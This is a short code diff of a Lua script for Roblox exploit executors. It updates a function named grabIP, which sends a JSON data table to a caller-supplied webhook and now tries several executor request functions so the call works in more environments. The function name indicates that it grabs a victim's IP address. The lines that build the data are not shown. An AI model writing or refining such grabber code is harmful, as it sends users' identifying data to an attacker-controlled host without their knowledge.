@@ -1,4 +1,4 @@
-local function grabIp(Webhook)
+local function grabIP(Webhook)
     
 local url = Webhook
 
@@ -60,9 +60,9 @@ local data = {
    }
 }
 
-request = http_request or request or HttpPost or syn.request
+local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
 
 local send = {Url = url, Body = game:GetService("HttpService"):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
 
-request(send)
+req(send)
 end
